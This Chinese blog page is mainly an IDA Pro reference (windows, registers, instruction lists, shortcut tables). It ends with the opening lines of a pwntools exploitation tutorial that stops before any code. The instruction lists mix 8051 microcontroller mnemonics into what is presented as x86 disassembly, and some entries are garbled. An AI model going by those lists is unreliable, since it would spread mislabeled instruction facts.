                <time title="Modified: 2019-09-15 00:15:26" itemprop="dateModified" datetime="2019-09-15T00:15:26-07:00">2019-09-15</time>
              </span>
            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="开始界面"><a href="#开始界面" class="headerlink" title="开始界面"></a>开始界面</h2><h6 id="New（新建）"><a href="#New（新建）" class="headerlink" title="New（新建）"></a>New（新建）</h6><h6 id="Go（运行）"><a href="#Go（运行）" class="headerlink" title="Go（运行）"></a>Go（运行）</h6><h6 id="Previous（上一个）"><a href="#Previous（上一个）" class="headerlink" title="Previous（上一个）"></a>Previous（上一个）</h6><h2 id="主界面工作区"><a href="#主界面工作区" class="headerlink" title="主界面工作区"></a>主界面工作区</h2><h6 id="IDA-View-A-反汇编窗口"><a href="#IDA-View-A-反汇编窗口" class="headerlink" title="IDA View-A 反汇编窗口"></a>IDA View-A 反汇编窗口</h6><h6 id="HexView-A-十六进制格式显示的窗口"><a href="#HexView-A-十六进制格式显示的窗口" class="headerlink" title="HexView-A 十六进制格式显示的窗口"></a>HexView-A 十六进制格式显示的窗口</h6><h6 id="Imports-导入表（程序中调用到的外面的函数）"><a href="#Imports-导入表（程序中调用到的外面的函数）" class="headerlink" title="Imports 导入表（程序中调用到的外面的函数）"></a>Imports 导入表（程序中调用到的外面的函数）</h6><h6 id="Functions-函数表（这个程序中的函数）"><a href="#Functions-函数表（这个程序中的函数）" class="headerlink" title="Functions 函数表（这个程序中的函数）"></a>Functions 函数表（这个程序中的函数）</h6><h6 id="Structures-结构"><a href="#Structures-结构" class="headerlink" title="Structures 结构"></a>Structures 结构</h6><h6 id="Enums-枚举"><a href="#Enums-枚举" class="headerlink" title="Enums 枚举"></a>Enums 枚举</h6><h2 id="IDA-View-A反汇编窗口"><a href="#IDA-View-A反汇编窗口" class="headerlink" title="IDA View-A反汇编窗口"></a>IDA View-A反汇编窗口</h2><h5 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h5><h6 id="AX-BX-CX-DX——通用寄存器"><a href="#AX-BX-CX-DX——通用寄存器" class="headerlink" title="AX BX CX DX——通用寄存器"></a>AX BX CX DX——通用寄存器</h6><h6 id="CS——代码段寄存器"><a href="#CS——代码段寄存器" class="headerlink" title="CS——代码段寄存器"></a>CS——代码段寄存器</h6><h6 id="IP——指令指针寄存器"><a href="#IP——指令指针寄存器" class="headerlink" title="IP——指令指针寄存器"></a>IP——指令指针寄存器</h6><h6 id="DS——段地址寄存器"><a href="#DS——段地址寄存器" class="headerlink" title="DS——段地址寄存器"></a>DS——段地址寄存器</h6><h6 id="SS——栈段寄存器"><a href="#SS——栈段寄存器" class="headerlink" title="SS——栈段寄存器"></a>SS——栈段寄存器</h6><h6 id="SP——栈偏移寄存器"><a href="#SP——栈偏移寄存器" class="headerlink" title="SP——栈偏移寄存器"></a>SP——栈偏移寄存器</h6><h6 id="IEAX——”累加器”-accumulator-它是很多加法乘法指令的缺省寄存器。"><a href="#IEAX——”累加器”-accumulator-它是很多加法乘法指令的缺省寄存器。" class="headerlink" title="IEAX——”累加器”(accumulator), 它是很多加法乘法指令的缺省寄存器。"></a>IEAX——”累加器”(accumulator), 它是很多加法乘法指令的缺省寄存器。</h6><h6 id="EBX——”基地址”-base-寄存器-在内存寻址时存放基地址。"><a href="#EBX——”基地址”-base-寄存器-在内存寻址时存放基地址。" class="headerlink" title="EBX——”基地址”(base)寄存器, 在内存寻址时存放基地址。"></a>EBX——”基地址”(base)寄存器, 在内存寻址时存放基地址。</h6><h6 id="ECX——计数器-counter-是重复-REP-前缀指令和LOOP指令的内定计数器。"><a href="#ECX——计数器-counter-是重复-REP-前缀指令和LOOP指令的内定计数器。" class="headerlink" title="ECX——计数器(counter), 是重复(REP)前缀指令和LOOP指令的内定计数器。"></a>ECX——计数器(counter), 是重复(REP)前缀指令和LOOP指令的内定计数器。</h6><h6 id="EDX——被用来放整数除法产生的余数。"><a href="#EDX——被用来放整数除法产生的余数。" class="headerlink" title="EDX——被用来放整数除法产生的余数。"></a>EDX——被用来放整数除法产生的余数。</h6><h6 id="ESI-EDI——分别叫做”源-目标索引寄存器”-source-destination-index-因为在很多字符串操作指令中，-DS-ESI指向源串-而ES-EDI指向目标串。"><a href="#ESI-EDI——分别叫做”源-目标索引寄存器”-source-destination-index-因为在很多字符串操作指令中，-DS-ESI指向源串-而ES-EDI指向目标串。" class="headerlink" title="ESI/EDI——分别叫做”源/目标索引寄存器”(source/destination index),因为在很多字符串操作指令中， DS:ESI指向源串,而ES:EDI指向目标串。"></a>ESI/EDI——分别叫做”源/目标索引寄存器”(source/destination index),因为在很多字符串操作指令中， DS:ESI指向源串,而ES:EDI指向目标串。</h6><h6 id="EBP——”基址指针”-BASE-POINTER-它最经常被用作高级语言函数调用的”框架指针”-frame-pointer-。"><a href="#EBP——”基址指针”-BASE-POINTER-它最经常被用作高级语言函数调用的”框架指针”-frame-pointer-。" class="headerlink" title="EBP——”基址指针”(BASE POINTER), 它最经常被用作高级语言函数调用的”框架指针”(frame pointer)。"></a>EBP——”基址指针”(BASE POINTER), 它最经常被用作高级语言函数调用的”框架指针”(frame pointer)。</h6><h6 id="ESP——专门用作堆栈指针，被形象地称为栈顶指针，堆栈的顶部是地址小的区域，压入堆栈的数据越多，ESP也就越来越小。在32位平台上，ESP每次减少4字节。"><a href="#ESP——专门用作堆栈指针，被形象地称为栈顶指针，堆栈的顶部是地址小的区域，压入堆栈的数据越多，ESP也就越来越小。在32位平台上，ESP每次减少4字节。" class="headerlink" title="ESP——专门用作堆栈指针，被形象地称为栈顶指针，堆栈的顶部是地址小的区域，压入堆栈的数据越多，ESP也就越来越小。在32位平台上，ESP每次减少4字节。"></a>ESP——专门用作堆栈指针，被形象地称为栈顶指针，堆栈的顶部是地址小的区域，压入堆栈的数据越多，ESP也就越来越小。在32位平台上，ESP每次减少4字节。</h6><h5 id="资料转移指令"><a href="#资料转移指令" class="headerlink" title="资料转移指令"></a>资料转移指令</h5><p>######MOV——移动</p>
<p>######MOVC——程式记忆体移动 </p>
<p>######MOVX——外部RAM和扩展I/O口与寄存器A的数据传送指令</p>
<h6 id="PUSH——放入堆栈"><a href="#PUSH——放入堆栈" class="headerlink" title="PUSH——放入堆栈"></a>PUSH——放入堆栈</h6><h6 id="POP——由堆叠取回"><a href="#POP——由堆叠取回" class="headerlink" title="POP——由堆叠取回"></a>POP——由堆叠取回</h6><h6 id="XCH——8位元交换"><a href="#XCH——8位元交换" class="headerlink" title="XCH——8位元交换"></a>XCH——8位元交换</h6><h6 id="XCHD——低4位元交换"><a href="#XCHD——低4位元交换" class="headerlink" title="XCHD——低4位元交换"></a>XCHD——低4位元交换</h6><h6 id="SWAP——高低4位元交换"><a href="#SWAP——高低4位元交换" class="headerlink" title="SWAP——高低4位元交换"></a>SWAP——高低4位元交换</h6><h5 id="算术指令"><a href="#算术指令" class="headerlink" title="算术指令"></a>算术指令</h5><h6 id="ADD——两数相加"><a href="#ADD——两数相加" class="headerlink" title="ADD——两数相加"></a>ADD——两数相加</h6><h6 id="ADDC——两数相加再加C"><a href="#ADDC——两数相加再加C" class="headerlink" title="ADDC——两数相加再加C"></a>ADDC——两数相加再加C</h6><h6 id="SUBB——两数相减再减C"><a href="#SUBB——两数相减再减C" class="headerlink" title="SUBB——两数相减再减C"></a>SUBB——两数相减再减C</h6><h6 id="INC——加一指令"><a href="#INC——加一指令" class="headerlink" title="INC——加一指令"></a>INC——加一指令</h6><h6 id="DEC——减一指令"><a href="#DEC——减一指令" class="headerlink" title="DEC——减一指令"></a>DEC——减一指令</h6><h6 id="MUL——（MUL-AB乘法指令仅此一条）相乘指令，所得的16位二进制数低8位存累加器A高8位存B"><a href="#MUL——（MUL-AB乘法指令仅此一条）相乘指令，所得的16位二进制数低8位存累加器A高8位存B" class="headerlink" title="MUL——（MUL AB乘法指令仅此一条）相乘指令，所得的16位二进制数低8位存累加器A高8位存B"></a>MUL——（MUL AB乘法指令仅此一条）相乘指令，所得的16位二进制数低8位存累加器A高8位存B</h6><h6 id="DIV——（DIV-AB-除法指令仅此一条）相除指令，所得商存A，余数存B"><a href="#DIV——（DIV-AB-除法指令仅此一条）相除指令，所得商存A，余数存B" class="headerlink" title="DIV——（DIV AB 除法指令仅此一条）相除指令，所得商存A，余数存B"></a>DIV——（DIV AB 除法指令仅此一条）相除指令，所得商存A，余数存B</h6><h5 id="控制转移类指令"><a href="#控制转移类指令" class="headerlink" title="控制转移类指令"></a>控制转移类指令</h5><h6 id="JC——C-1时跳"><a href="#JC——C-1时跳" class="headerlink" title="JC——C=1时跳"></a>JC——C=1时跳</h6><h6 id="JNC——C-0时跳"><a href="#JNC——C-0时跳" class="headerlink" title="JNC——C=0时跳"></a>JNC——C=0时跳</h6><h6 id="JB——位元-1时跳"><a href="#JB——位元-1时跳" class="headerlink" title="JB——位元=1时跳"></a>JB——位元=1时跳</h6><h6 id="JNB——位元-0时跳"><a href="#JNB——位元-0时跳" class="headerlink" title="JNB——位元=0时跳"></a>JNB——位元=0时跳</h6><h6 id="JBC——位元-1时跳且清除此位元"><a href="#JBC——位元-1时跳且清除此位元" class="headerlink" title="JBC——位元=1时跳且清除此位元"></a>JBC——位元=1时跳且清除此位元</h6><h6 id="LCALL——长调用子程序"><a href="#LCALL——长调用子程序" class="headerlink" title="LCALL——长调用子程序"></a>LCALL——长调用子程序</h6><h6 id="ACALL——绝对调用子程序"><a href="#ACALL——绝对调用子程序" class="headerlink" title="ACALL——绝对调用子程序"></a>ACALL——绝对调用子程序</h6><h6 id="RET——由副程式返回"><a href="#RET——由副程式返回" class="headerlink" title="RET——由副程式返回"></a>RET——由副程式返回</h6><h6 id="RETI——由中断副程式返回"><a href="#RETI——由中断副程式返回" class="headerlink" title="RETI——由中断副程式返回"></a>RETI——由中断副程式返回</h6><h6 id="AJMP——绝对转移"><a href="#AJMP——绝对转移" class="headerlink" title="AJMP——绝对转移"></a>AJMP——绝对转移</h6><h6 id="SJMP——相对转移"><a href="#SJMP——相对转移" class="headerlink" title="SJMP——相对转移"></a>SJMP——相对转移</h6><h6 id="JMP——-A-DPTR-散转，相对DPTR的间接转移"><a href="#JMP——-A-DPTR-散转，相对DPTR的间接转移" class="headerlink" title="JMP——@A+DPTR 散转，相对DPTR的间接转移"></a>JMP——@A+DPTR 散转，相对DPTR的间接转移</h6><h6 id="JZ——A-0时跳"><a href="#JZ——A-0时跳" class="headerlink" title="JZ——A=0时跳"></a>JZ——A=0时跳</h6><h6 id="JNZA——0时跳"><a href="#JNZA——0时跳" class="headerlink" title="JNZA——0时跳"></a>JNZA——0时跳</h6><h6 id="CJNE——二数比较-不相等时跳"><a href="#CJNE——二数比较-不相等时跳" class="headerlink" title="CJNE——二数比较,不相等时跳"></a>CJNE——二数比较,不相等时跳</h6><h6 id="DJNZ——减一-不等於0时跳"><a href="#DJNZ——减一-不等於0时跳" class="headerlink" title="DJNZ——减一,不等於0时跳"></a>DJNZ——减一,不等於0时跳</h6><h6 id="NOP——空操作"><a href="#NOP——空操作" class="headerlink" title="NOP——空操作"></a>NOP——空操作</h6><h5 id="位变量指令"><a href="#位变量指令" class="headerlink" title="位变量指令"></a>位变量指令</h5><h6 id="SETB——设定为1ORG-程序开始，规定程序的起始地址"><a href="#SETB——设定为1ORG-程序开始，规定程序的起始地址" class="headerlink" title="SETB——设定为1ORG 程序开始，规定程序的起始地址"></a>SETB——设定为1ORG 程序开始，规定程序的起始地址</h6><h6 id="END——程序结束"><a href="#END——程序结束" class="headerlink" title="END——程序结束"></a>END——程序结束</h6><h6 id="EQU——等值指令（先赋值后使用）例：SUM-EQU-30H"><a href="#EQU——等值指令（先赋值后使用）例：SUM-EQU-30H" class="headerlink" title="EQU——等值指令（先赋值后使用）例：SUM EQU 30H"></a>EQU——等值指令（先赋值后使用）例：SUM EQU 30H</h6><h6 id="DB——定义字节指令"><a href="#DB——定义字节指令" class="headerlink" title="DB——定义字节指令"></a>DB——定义字节指令</h6><h6 id="DW——定义字内容"><a href="#DW——定义字内容" class="headerlink" title="DW——定义字内容"></a>DW——定义字内容</h6><h6 id="DS——定义保留一定的存贮单元数目"><a href="#DS——定义保留一定的存贮单元数目" class="headerlink" title="DS——定义保留一定的存贮单元数目"></a>DS——定义保留一定的存贮单元数目</h6><h6 id="BIT——位地址符号指令-例：SAM-BIT-P1-0"><a href="#BIT——位地址符号指令-例：SAM-BIT-P1-0" class="headerlink" title="BIT——位地址符号指令 例：SAM BIT P1.0"></a>BIT——位地址符号指令 例：SAM BIT P1.0</h6><h6 id="RET——子程序返回指令"><a href="#RET——子程序返回指令" class="headerlink" title="RET——子程序返回指令"></a>RET——子程序返回指令</h6><h6 id="RETI——中断子程序返回指令-本条指令地址"><a href="#RETI——中断子程序返回指令-本条指令地址" class="headerlink" title="RETI——中断子程序返回指令$ 本条指令地址"></a>RETI——中断子程序返回指令$ 本条指令地址</h6><h2 id="IDA快捷键"><a href="#IDA快捷键" class="headerlink" title="IDA快捷键"></a>IDA快捷键</h2><h6 id="空格键——反汇编窗口切换文本跟图形"><a href="#空格键——反汇编窗口切换文本跟图形" class="headerlink" title="空格键——反汇编窗口切换文本跟图形"></a>空格键——反汇编窗口切换文本跟图形</h6><h6 id="ESC——退到上一个操作地址"><a href="#ESC——退到上一个操作地址" class="headerlink" title="ESC——退到上一个操作地址"></a>ESC——退到上一个操作地址</h6><h6 id="G——搜索地址或者符号"><a href="#G——搜索地址或者符号" class="headerlink" title="G——搜索地址或者符号"></a>G——搜索地址或者符号</h6><h6 id="N——重命名"><a href="#N——重命名" class="headerlink" title="N——重命名"></a>N——重命名</h6><h6 id="；——注释"><a href="#；——注释" class="headerlink" title="；——注释"></a>；——注释</h6><h6 id="ALT-M——添加标签"><a href="#ALT-M——添加标签" class="headerlink" title="ALT+M——添加标签"></a>ALT+M——添加标签</h6><h6 id="CTRL-M——列出所有标签"><a href="#CTRL-M——列出所有标签" class="headerlink" title="CTRL+M——列出所有标签"></a>CTRL+M——列出所有标签</h6><h6 id="CTRL-S——二进制段的开始地址结束地址"><a href="#CTRL-S——二进制段的开始地址结束地址" class="headerlink" title="CTRL +S——二进制段的开始地址结束地址"></a>CTRL +S——二进制段的开始地址结束地址</h6><h6 id="C-code——光标地址出内容解析成代码"><a href="#C-code——光标地址出内容解析成代码" class="headerlink" title="C code——光标地址出内容解析成代码"></a>C code——光标地址出内容解析成代码</h6><h6 id="P——在函数开始处使用P，从当前地址处解析成函数"><a href="#P——在函数开始处使用P，从当前地址处解析成函数" class="headerlink" title="P——在函数开始处使用P，从当前地址处解析成函数"></a>P——在函数开始处使用P，从当前地址处解析成函数</h6><h6 id="D——data解析成数据"><a href="#D——data解析成数据" class="headerlink" title="D——data解析成数据"></a>D——data解析成数据</h6><h6 id="A——ASCII解析成ASCII"><a href="#A——ASCII解析成ASCII" class="headerlink" title="A——ASCII解析成ASCII"></a>A——ASCII解析成ASCII</h6><h6 id="U——unDefined解析成未定义的内容"><a href="#U——unDefined解析成未定义的内容" class="headerlink" title="U——unDefined解析成未定义的内容"></a>U——unDefined解析成未定义的内容</h6><h6 id="X——交叉引用"><a href="#X——交叉引用" class="headerlink" title="X——交叉引用"></a>X——交叉引用</h6><h6 id="F5——C伪代码"><a href="#F5——C伪代码" class="headerlink" title="F5——C伪代码"></a>F5——C伪代码</h6><h6 id="ALT-T——搜索文本"><a href="#ALT-T——搜索文本" class="headerlink" title="ALT+T——搜索文本"></a>ALT+T——搜索文本</h6><h6 id="ALT-B——搜索16进制-搜索opcode"><a href="#ALT-B——搜索16进制-搜索opcode" class="headerlink" title="ALT+B——搜索16进制 搜索opcode"></a>ALT+B——搜索16进制 搜索opcode</h6><h6 id="CTRL-ALT-B——打开断点列表"><a href="#CTRL-ALT-B——打开断点列表" class="headerlink" title="CTRL+ALT+B——打开断点列表"></a>CTRL+ALT+B——打开断点列表</h6><h6 id="F7——单步步入"><a href="#F7——单步步入" class="headerlink" title="F7——单步步入"></a>F7——单步步入</h6><h6 id="F8——单步不过"><a href="#F8——单步不过" class="headerlink" title="F8——单步不过"></a>F8——单步不过</h6><h6 id="CTRL-F7——运行到函数返回地址"><a href="#CTRL-F7——运行到函数返回地址" class="headerlink" title="CTRL+F7——运行到函数返回地址"></a>CTRL+F7——运行到函数返回地址</h6><h6 id="F4——运行到光标处"><a href="#F4——运行到光标处" class="headerlink" title="F4——运行到光标处"></a>F4——运行到光标处</h6><table>
<thead>
<tr>
<th>窗口名称</th>
<th>快捷键</th>
</tr>
</thead>
<tbody><tr>
<td>Names Window</td>
<td>Shift+F4</td>
</tr>
<tr>
<td>Functions Window</td>
<td>Shift+F3</td>
</tr>
<tr>
<td>Strings Window</td>
<td>Shift+F12</td>
</tr>
<tr>
<td>Segments</td>
<td>Shift+F7</td>
</tr>
<tr>
<td>Segment registers</td>
<td>Shift+F8</td>
</tr>
<tr>
<td>Signatures</td>
<td>Shift+F5</td>
</tr>
<tr>
<td>Type libraries</td>
<td>Shift+F11</td>
</tr>
<tr>
<td>Structures</td>
<td>Shift+F9</td>
</tr>
<tr>
<td>Enumerations</td>
<td>Shift+F10</td>
</tr>
</tbody></table>
<hr>
<p>Data Format Options</p>
<table>
<thead>
<tr>
<th>窗口名称</th>
<th>快捷键</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>ASCII strings style</td>
<td>Alt+A</td>
<td></td>
</tr>
<tr>
<td>Setup data types</td>
<td>Alt+D</td>
<td></td>
</tr>
</tbody></table>
<hr>
<p>File Operations</p>
<table>
<thead>
<tr>
<th>窗口名称</th>
<th>快捷键</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>Parse C header file</td>
<td>Ctrl+F9</td>
<td></td>
</tr>
<tr>
<td>Create ASM file</td>
<td>Alt+F10</td>
<td></td>
</tr>
<tr>
<td>Save database</td>
<td>Ctrl+W</td>
<td></td>
</tr>
</tbody></table>
<hr>
<p>Navigation</p>
<table>
<thead>
<tr>
<th>窗口名称</th>
<th>快捷键</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>Jump to operand</td>
<td>Enter</td>
<td></td>
</tr>
<tr>
<td>Jump in new window</td>
<td>Alt+Enter</td>
<td></td>
</tr>
<tr>
<td>Jump to previous position</td>
<td>Esc</td>
<td></td>
</tr>
<tr>
<td>Jump to next position</td>
<td>Ctrl+Enter</td>
<td></td>
</tr>
<tr>
<td>Jump to address</td>
<td>G</td>
<td></td>
</tr>
<tr>
<td>Jump by name</td>
<td>Ctrl+L</td>
<td></td>
</tr>
<tr>
<td>Jump to function</td>
<td>Ctrl+P</td>
<td></td>
</tr>
<tr>
<td>Jump to segment</td>
<td>Ctrl+S</td>
<td></td>
</tr>
<tr>
<td>Jump to segment register</td>
<td>Ctrl+G</td>
<td></td>
</tr>
<tr>
<td>Jump to problem</td>
<td>Ctrl+Q</td>
<td></td>
</tr>
<tr>
<td>Jump to cross reference</td>
<td>Ctrl+X</td>
<td></td>
</tr>
<tr>
<td>Jump to xref to operand</td>
<td>X</td>
<td></td>
</tr>
<tr>
<td>Jump to entry point</td>
<td>Ctrl+E</td>
<td></td>
</tr>
<tr>
<td>Mark Position</td>
<td>Alt+M</td>
<td></td>
</tr>
<tr>
<td>Jump to marked position</td>
<td>Ctrl+M</td>
<td></td>
</tr>
</tbody></table>
<hr>
<p>Debugger</p>
<table>
<thead>
<tr>
<th>窗口名称</th>
<th>快捷键</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>Start process</td>
<td>F9</td>
<td></td>
</tr>
<tr>
<td>Terminate process</td>
<td>Ctrl+F2</td>
<td></td>
</tr>
<tr>
<td>Step into</td>
<td>F7</td>
<td></td>
</tr>
<tr>
<td>Step over</td>
<td>F8</td>
<td></td>
</tr>
<tr>
<td>Run until return</td>
<td>Ctrl+F7</td>
<td></td>
</tr>
<tr>
<td>Run to cursor</td>
<td>F4</td>
<td></td>
</tr>
</tbody></table>
<hr>
<p>Breakpoints</p>
<table>
<thead>
<tr>
<th>窗口名称</th>
<th>快捷键</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>Breakpoint list</td>
<td>Ctrl+Alt+B</td>
<td></td>
</tr>
</tbody></table>
<hr>
<p>Watches</p>
<table>
<thead>
<tr>
<th>窗口名称</th>
<th>快捷键</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>Delete watch</td>
<td>Del</td>
<td></td>
</tr>
</tbody></table>
<hr>
<p>Tracing</p>
<table>
<thead>
<tr>
<th>窗口名称</th>
<th>快捷键</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>Stack trace</td>
<td>Ctrl+Alt+S</td>
<td></td>
</tr>
</tbody></table>
<hr>
<p>Search</p>
<table>
<thead>
<tr>
<th>窗口名称</th>
<th>快捷键</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>Next code</td>
<td>Alt+C</td>
<td></td>
</tr>
<tr>
<td>Next data</td>
<td>Ctrl+D</td>
<td></td>
</tr>
<tr>
<td>Next explored</td>
<td>Ctrl+A</td>
<td></td>
</tr>
<tr>
<td>Next unexplored</td>
<td>Ctrl+U</td>
<td></td>
</tr>
<tr>
<td>Immediate value</td>
<td>Alt+I</td>
<td></td>
</tr>
<tr>
<td>Next immediate value</td>
<td>Ctrl+I</td>
<td></td>
</tr>
<tr>
<td>Text</td>
<td>Alt+T</td>
<td></td>
</tr>
<tr>
<td>Next text</td>
<td>Ctrl+T</td>
<td></td>
</tr>
<tr>
<td>Sequence of bytes</td>
<td>Alt+B</td>
<td></td>
</tr>
<tr>
<td>Next sequence of bytes</td>
<td>Ctrl+B</td>
<td></td>
</tr>
<tr>
<td>Not function</td>
<td>Alt+U</td>
<td></td>
</tr>
<tr>
<td>Next void</td>
<td>Ctrl+V</td>
<td></td>
</tr>
<tr>
<td>Error operand</td>
<td>Ctrl+F</td>
<td></td>
</tr>
</tbody></table>
<hr>
<p>Graphing</p>
<table>
<thead>
<tr>
<th>窗口名称</th>
<th>快捷键</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>Flow chart</td>
<td>F12</td>
<td></td>
</tr>
<tr>
<td>Function calls</td>
<td>Ctrl+F12</td>
<td></td>
</tr>
</tbody></table>
<hr>
<p>Miscellaneous</p>
<table>
<thead>
<tr>
<th>窗口名称</th>
<th>快捷键</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>Calculator</td>
<td>?</td>
<td></td>
</tr>
<tr>
<td>Cycle through open views</td>
<td>Ctrl+Tab</td>
<td></td>
</tr>
<tr>
<td>Select tab</td>
<td>Alt + [1…N]</td>
<td></td>
</tr>
<tr>
<td>Close current view</td>
<td>Ctrl+F4</td>
<td></td>
</tr>
<tr>
<td>Exit</td>
<td>Alt+X</td>
<td></td>
</tr>
<tr>
<td>IDC Command</td>
<td>Shift+F2</td>
<td></td>
</tr>
</tbody></table>
<hr>
<p>Edit (Data Types – etc)</p>
<table>
<thead>
<tr>
<th>窗口名称</th>
<th>快捷键</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>Copy</td>
<td>Ctrl+Ins</td>
<td></td>
</tr>
<tr>
<td>Begin selection</td>
<td>Alt+L</td>
<td></td>
</tr>
<tr>
<td>Manual instruction</td>
<td>Alt+F2</td>
<td></td>
</tr>
<tr>
<td>Code</td>
<td>C</td>
<td></td>
</tr>
<tr>
<td>Data</td>
<td>D</td>
<td></td>
</tr>
<tr>
<td>Struct variable</td>
<td>Alt+Q</td>
<td></td>
</tr>
<tr>
<td>ASCII string</td>
<td>A</td>
<td></td>
</tr>
<tr>
<td>Array</td>
<td>Num *</td>
<td></td>
</tr>
<tr>
<td>Undefine</td>
<td>U</td>
<td></td>
</tr>
<tr>
<td>Rename</td>
<td>N</td>
<td></td>
</tr>
</tbody></table>
<hr>
<p>Operand Type</p>
<table>
<thead>
<tr>
<th>窗口名称</th>
<th>快捷键</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>Offset (data segment)</td>
<td>O</td>
<td></td>
</tr>
<tr>
<td>Offset (current segment)</td>
<td>Ctrl+O</td>
<td></td>
</tr>
<tr>
<td>Offset by (any segment)</td>
<td>Alt+R</td>
<td></td>
</tr>
<tr>
<td>Offset (user-defined)</td>
<td>Ctrl+R</td>
<td></td>
</tr>
<tr>
<td>Offset (struct)</td>
<td>T</td>
<td></td>
</tr>
<tr>
<td>Number (default)</td>
<td>#</td>
<td></td>
</tr>
<tr>
<td>Hexadecimal</td>
<td>Q</td>
<td></td>
</tr>
<tr>
<td>Decimal</td>
<td>H</td>
<td></td>
</tr>
<tr>
<td>Binary</td>
<td>B</td>
<td></td>
</tr>
<tr>
<td>Character</td>
<td>R</td>
<td></td>
</tr>
<tr>
<td>Segment</td>
<td>S</td>
<td></td>
</tr>
<tr>
<td>Enum member</td>
<td>M</td>
<td></td>
</tr>
<tr>
<td>Stack variable</td>
<td>K</td>
<td></td>
</tr>
<tr>
<td>Change sign</td>
<td>Underscore (_)</td>
<td></td>
</tr>
<tr>
<td>Bitwise negate</td>
<td>~</td>
<td></td>
</tr>
<tr>
<td>Manual</td>
<td>_ Alt+F1</td>
<td></td>
</tr>
</tbody></table>
<hr>
<p>Comments</p>
<table>
<thead>
<tr>
<th>窗口名称</th>
<th>快捷键</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>Enter comment</td>
<td>:</td>
<td></td>
</tr>
<tr>
<td>Enter repeatable comment</td>
<td>;</td>
<td></td>
</tr>
<tr>
<td>Enter anterior lines</td>
<td>Ins</td>
<td></td>
</tr>
<tr>
<td>Enter posterior lines</td>
<td>Shift+Ins</td>
<td></td>
</tr>
<tr>
<td>Insert predefined comment</td>
<td>Shift+F1</td>
<td></td>
</tr>
</tbody></table>
<hr>
<p>Segments</p>
<table>
<thead>
<tr>
<th>窗口名称</th>
<th>快捷键</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>Edit segment</td>
<td>Alt+S</td>
<td></td>
</tr>
<tr>
<td>Change segment register value</td>
<td>Alt+G</td>
<td></td>
</tr>
</tbody></table>
<hr>
<p>Structs</p>
<table>
<thead>
<tr>
<th>窗口名称</th>
<th>快捷键</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>Struct var</td>
<td>Alt+Q</td>
<td></td>
</tr>
<tr>
<td>Force zero offset field</td>
<td>Ctrl+Z</td>
<td></td>
</tr>
<tr>
<td>Select union member</td>
<td>Alt+Y</td>
<td></td>
</tr>
</tbody></table>
<hr>
<p>Functions</p>
<table>
<thead>
<tr>
<th>窗口名称</th>
<th>快捷键</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>Create function</td>
<td>P</td>
<td></td>
</tr>
<tr>
<td>Edit function</td>
<td>Alt+P</td>
<td></td>
</tr>
<tr>
<td>Set function end</td>
<td>E</td>
<td></td>
</tr>
<tr>
<td>Stack variables</td>
<td>Ctrl+K</td>
<td></td>
</tr>
<tr>
<td>Change stack pointer</td>
<td>Alt+K</td>
<td></td>
</tr>
<tr>
<td>Rename register</td>
<td>V</td>
<td></td>
</tr>
<tr>
<td>Set function type</td>
<td>Y</td>
<td></td>
</tr>
</tbody></table>
<hr>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/14/PWNTOOLS╡─╩╣╙├/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/09/14/PWNTOOLS╡─╩╣╙├/" class="post-title-link" itemprop="url">PWNTOOLS的使用</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-09-14 09:09:08" itemprop="dateCreated datePublished" datetime="2019-09-14T09:09:08-07:00">2019-09-14</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-09-15 00:09:36" itemprop="dateModified" datetime="2019-09-15T00:09:36-07:00">2019-09-15</time>
              </span>
            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>pwntools</strong>是一个二进制利用框架。官方文档提供了详细的<strong>api</strong>规范。由于本文只是用来介绍<strong>pwntools</strong>使用方法，不会过于详细的讲解各种二进制漏洞攻击技术。</p>
<h2 id="Pwntools的“Hello-World”"><a href="#Pwntools的“Hello-World”" class="headerlink" title="Pwntools的“Hello World”"></a>Pwntools的“Hello World”</h2><p>栈溢出无疑是二进制攻击的“Hello World”。这里，我们用pwnable.kr的bof来进行展示。</p>
